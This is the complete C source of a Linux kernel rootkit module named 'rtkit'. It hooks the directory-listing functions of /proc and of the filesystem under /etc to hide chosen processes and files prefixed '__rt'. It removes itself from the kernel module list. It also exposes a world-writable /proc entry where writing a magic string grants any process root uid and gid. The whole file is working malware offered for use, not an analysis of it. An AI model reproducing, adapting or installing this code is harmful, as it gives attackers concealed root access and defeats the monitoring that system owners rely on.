#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })


#define MAX_PIDS 50

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Arkadiusz Hiler<ivyl@sigillum.cc>");
MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");

//STATIC VARIABLES SECTION
//we don't want to have it visible in kallsyms and have access to it all the time
static struct proc_dir_entry *proc_rtkit;

static int (*proc_readdir_orig)(struct file *, struct dir_context *);
static int (*fs_readdir_orig)(struct file *, struct dir_context *);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;

static char module_hidden = 0;

static char module_status[1024];

static char kernel_buff[1024];

//MODULE HELPERS
void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}
 
void module_show(void)
{
	int result;
	if (!module_hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
	module_hidden = !module_hidden;
}

//PAGE RW HELPERS
static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}

//CALLBACK SECTION
//static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
static int proc_filldir_new(struct dir_context *dirent, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	printk("fs_filldir_new");
	dirent->actor=proc_filldir_orig;
	for (i=0; i < current_pid; i++) {
		if (!strcmp(name, pids_to_hide[i])) return 0;
	}
	if (!strcmp(name, "rtkit")) return 0;
	return proc_filldir_orig(dirent, name, namelen, offset, ino, d_type);
}

static int proc_readdir_new(struct file *filp, struct dir_context *dirent)
{
	printk("proc_readdir_new");
	proc_filldir_orig = dirent->actor;
	dirent->actor = proc_filldir_new;
	return proc_readdir_orig(filp, dirent);
}

//static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
static int fs_filldir_new(struct dir_context *dirent, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	printk("fs_filldir_new");
	dirent->actor=fs_filldir_orig;
	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
	return fs_filldir_orig(dirent, name, namelen, offset, ino, d_type);
}

//static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
static int fs_readdir_new(struct file *filp, struct dir_context *dirent)
{
	printk("fs_readdir_new");
	fs_filldir_orig = dirent->actor;
	dirent->actor = fs_filldir_new;
	return fs_readdir_orig(filp, dirent);
}

//static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
static ssize_t rtkit_read(struct file *file, char __user *buff, size_t count, loff_t *offp)
{
	int size;
	long long p = *offp;
	int ret;
	
	sprintf(module_status, 
"RTKIT\n\
DESC:\n\
  hides files prefixed with __rt or 10-__rt and gives root\n\
CMNDS:\n\
  mypenislong - uid and gid 0 for writing process\n\
  hpXXXX - hides proc with id XXXX\n\
  up - unhides last process\n\
  thf - toogles file hiding\n\
  mh - module hide\n\
  ms - module show\n\
STATUS\n\
  fshide: %d\n\
  pids_hidden: %d\n\
  module_hidden: %d\n", hide_files, current_pid, module_hidden);

	size = strlen(module_status);

	if (p >= size) return 0;
  
	if (count >= size-p) {
		ret = size-p - copy_to_user(buff, module_status+p, size-p);
	} else {
		ret = count - copy_to_user(buff, module_status+p, count);
	}
  	*offp += ret;
	return ret;
}

static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *offp)
{
	
	copy_from_user(kernel_buff, buff, MIN(1024, count));
	if (!strncmp(kernel_buff, "mypenislong", MIN(11, count))) { //changes to root
		struct cred *credentials = prepare_creds();
		(credentials->uid).val = (credentials->euid).val = 0;
		(credentials->gid).val = (credentials->egid).val = 0;
		commit_creds(credentials);
	} else if (!strncmp(kernel_buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
		if (current_pid < MAX_PIDS) copy_from_user(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
	} else if (!strncmp(kernel_buff, "up", MIN(2, count))) {//unhides last hidden process
		if (current_pid > 0) current_pid--;
	} else if (!strncmp(kernel_buff, "thf", MIN(3, count))) {//toggles hide files in fs
		hide_files = !hide_files;
	} else if (!strncmp(kernel_buff, "mh", MIN(2, count))) {//module hide
		module_hide();
	} else if (!strncmp(kernel_buff, "ms", MIN(2, count))) {//module hide
		module_show();
	}
	
        return count;
}

static const struct file_operations rtkit_fops =
{
		/*.owner = THIS_MODULE,*/
	/*.open = rtkit_open,*/
	.read = rtkit_read,
	.write = rtkit_write,
	/*.llseek = seq_lseek,*/
	/*.release = single_release,*/
};

//INITIALIZING/CLEANING HELPER METHODS SECTION
static void procfs_clean(void)
{
	if (proc_rtkit != NULL) {
		remove_proc_entry("rtkit", NULL);
		proc_rtkit = NULL;
	}
	if (proc_fops != NULL && proc_readdir_orig != NULL) {
		set_addr_rw(proc_fops);
		if(proc_fops->iterate_shared)
			proc_fops->iterate_shared = proc_readdir_orig;
		else
			proc_fops->iterate = proc_readdir_orig;
		set_addr_ro(proc_fops);
	}
}
	
static void fs_clean(void)
{
	if (fs_fops != NULL && fs_readdir_orig != NULL) {
		set_addr_rw(fs_fops);
		if(fs_fops->iterate_shared)
			fs_fops->iterate_shared = fs_readdir_orig;
		else	
			fs_fops->iterate = fs_readdir_orig;
		set_addr_ro(fs_fops);
	}
}

static int __init procfs_init(void)
{
	struct file *proc_filp;
	printk("in_rootkit_proc_init");
	//new entry in proc root with 666 rights
	proc_rtkit = proc_create("rtkit", 0666, NULL, &rtkit_fops);
	if (proc_rtkit == NULL) return 0;
	printk("rootkit_proc_init_rtkit_success");
	//proc_root = proc_rtkit->parent;
	//if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
	//	return 0;
	//}

	proc_filp = filp_open("/proc", O_RDONLY, 0);
	if (proc_filp == NULL) return 0;
	printk("rootkit_proc_init_proc_success");
	//substitute proc readdir to our wersion (using page mode change)
	proc_fops = ((struct file_operations *) proc_filp->f_op);
	filp_close(proc_filp, NULL);

	if(proc_fops->iterate_shared){
		proc_readdir_orig = proc_fops->iterate_shared;
		set_addr_rw(proc_fops);
		proc_fops->iterate_shared = proc_readdir_new;
		set_addr_ro(proc_fops);
	}
	else{
		proc_readdir_orig = proc_fops->iterate;
		set_addr_rw(proc_fops);
		proc_fops->iterate = proc_readdir_new;
		set_addr_ro(proc_fops);
	}

	printk("rootkit_proc_init_success");
	return 1;
}

static int __init fs_init(void)
{
	struct file *etc_filp;
	printk("in_rootkit_fs_init");	
	//get file_operations of /etc
	etc_filp = filp_open("/etc", O_RDONLY, 0);
	if (etc_filp == NULL) return 0;
	printk("rootkit_fs_init_etc_success");
	fs_fops = (struct file_operations *) etc_filp->f_op;
	filp_close(etc_filp, NULL);
	
	//substitute readdir of fs on which /etc is
	if(fs_fops->iterate_shared){
		fs_readdir_orig = fs_fops->iterate_shared;
		set_addr_rw(fs_fops);
		fs_fops->iterate_shared = fs_readdir_new;
		set_addr_ro(fs_fops);
	}
	else{
		fs_readdir_orig = fs_fops->iterate;
		set_addr_rw(fs_fops);
		fs_fops->iterate = fs_readdir_new;
		set_addr_ro(fs_fops);
	}
	
	printk("rootkit_fs_init_success");
	return 1;
}

//MODULE INIT/EXIT
static int __init rootkit_init(void)
{
	if (!procfs_init() || !fs_init()) {
		procfs_clean();
		fs_clean();
		printk("rootkit_init_fail");
		return 1;
	}
	module_hide();
	printk("rootkit_init_success");	
	return 0;
}

static void __exit rootkit_exit(void)
{
	procfs_clean();
	fs_clean();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
